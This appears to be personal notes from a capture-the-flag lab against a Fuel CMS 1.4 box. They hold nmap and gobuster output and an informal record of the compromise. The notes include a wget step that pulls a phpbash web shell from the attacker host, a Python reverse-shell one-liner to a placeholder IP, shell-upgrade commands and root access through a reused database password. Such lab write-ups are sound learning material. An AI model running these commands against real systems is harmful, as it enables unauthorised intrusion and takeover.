@@ -1,0 +1,93 @@
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 14:36 CEST
+Nmap scan report for 10.10.39.156
+Host is up (0.050s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-title: Welcome to FUEL CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=6/5%OT=80%CT=1%CU=34832%PV=Y%DS=2%DC=T%G=Y%TM=647DD6ED
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OPS(
+OS:O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11
+OS:NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
+OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   35.19 ms 10.9.0.1
+2   35.56 ms 10.10.39.156
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.39.156/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/05 14:37:37 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/index                (Status: 200) [Size: 16595]
+[2K/home                 (Status: 200) [Size: 16595]
+[2K/0                    (Status: 200) [Size: 16595]
+[2K/assets               (Status: 301) [Size: 313] [--> http://10.10.39.156/assets/]
+[2K/'                    (Status: 400) [Size: 1134]
+[2K/$FILE                (Status: 400) [Size: 1134]
+[2K/$file                (Status: 400) [Size: 1134]
+[2K/offline              (Status: 200) [Size: 70]
+[2K/*checkout*           (Status: 400) [Size: 1134]
+
+
+the server is running fuel cms 1.4 and that is vulnerable to rce 
+
+downloaded an exploit from exploit-db
+
+so with that i gained rce but its kinda wonky so i need to get a better reverse shell
+
+read in a writeup that its possible to upload something called phpbash which will give us some kind of a reverse shell in the browser
+
+downloaded it here: https://github.com/Arrexel/phpbash
+
+hosted it with python3 -m http.server 8081 
+
+then downloaded it on the victim machine with wget 10.9.58.163:8081/phpbash.php 
+
+then accessed it via browser on http://10.10.39.156/phpbash.php 
+
+used instructions from /res to get a socat reverse shell
+
+uploaded and ran linpeas
+
+found some .sh files in /usr/sbin/alsa-info.sh and /usr/bin/amuFormat.sh and /usr/bin/getttext.sh
+
+oh and i also had to upgrade the shell with python 
+
+also found a pretty useful command in the writeup for a fully interactive shell:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+
+After you run that in phpbash, you should see a new message on your netcat listener and have a dollar sign. If you type whoami on it, you will see you now have a reverse shell as “www-data”. However this shell still won’t do what we want it to, so we need to get full tty for an interactive shell. First, enter this python command: python -c 'import pty; pty.spawn("/bin/bash")'.Then, press CTRL+Z to put the shell in the background. Next, type this command in the same window: stty raw -echo;fg. This will bring your shell back to the foreground with full interactive experience.
+
+
+so linpeas showed some credentials for a database where the password was: mememe 
+
+tried these with su root and they worked...
+
+
